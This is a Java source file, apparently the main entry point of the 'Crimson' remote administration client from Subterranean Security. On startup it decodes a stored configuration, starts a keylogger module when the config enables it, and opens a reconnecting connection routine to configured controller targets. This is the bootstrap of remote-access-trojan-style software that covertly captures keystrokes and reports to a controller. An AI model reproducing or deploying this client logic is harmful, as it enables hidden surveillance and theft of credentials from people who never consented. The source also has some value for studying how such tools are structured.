/******************************************************************************
 *                                                                            *
 *                    Copyright 2016 Subterranean Security                    *
 *                                                                            *
 *  Licensed under the Apache License, Version 2.0 (the "License");           *
 *  you may not use this file except in compliance with the License.          *
 *  You may obtain a copy of the License at                                   *
 *                                                                            *
 *      http://www.apache.org/licenses/LICENSE-2.0                            *
 *                                                                            *
 *  Unless required by applicable law or agreed to in writing, software       *
 *  distributed under the License is distributed on an "AS IS" BASIS,         *
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.  *
 *  See the License for the specific language governing permissions and       *
 *  limitations under the License.                                            *
 *                                                                            *
 *****************************************************************************/
package com.subterranean_security.crimson.client;

import java.io.File;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import com.subterranean_security.crimson.client.modules.Keylogger;
import com.subterranean_security.crimson.client.modules.Keylogger.RefreshMethod;
import com.subterranean_security.crimson.core.Common;
import com.subterranean_security.crimson.core.proto.Generator.ClientConfig;
import com.subterranean_security.crimson.core.storage.ClientDB;
import com.subterranean_security.crimson.core.util.B64;
import com.subterranean_security.crimson.core.util.CUtil;
import com.subterranean_security.crimson.core.util.EH;
import com.subterranean_security.crimson.core.util.Native;

public class Client {
	private static final Logger log = LoggerFactory.getLogger(Client.class);

	public static ClientDB clientDB;
	public static ClientConfig ic;

	public static void main(String[] args) {

		CUtil.Logging.configure();

		log.info("Initializing client");

		// Establish the custom fallback exception handler
		Thread.setDefaultUncaughtExceptionHandler(new EH());

		// Establish the custom shutdown hook
		Runtime.getRuntime().addShutdownHook(new ShutdownHook());

		// Load native libraries
		Native.Loader.load();

		try {
			clientDB = new ClientDB(new File(Common.Directories.base + "/var/client.db"));
			ic = ClientConfig.parseFrom(B64.decode(clientDB.getString("ic")));
		} catch (Exception e) {
			// TODO: handle exception
			System.out.println("Database error");
		}

		try {
			Common.cvid = Client.clientDB.getInteger("cvid");
		} catch (Exception e2) {
		}

		log.debug("CVID: {}", Common.cvid);

		if (ic.getKeylogger()) {
			// TODO set parameters
			Keylogger.start(RefreshMethod.TIME, 20000);
		}

		ClientStore.Connections.setTargets(ic.getTargetList());
		ClientStore.Connections.setPeriod(ic.getReconnectPeriod());
		ClientStore.Connections.connectionRoutine();

	}

}
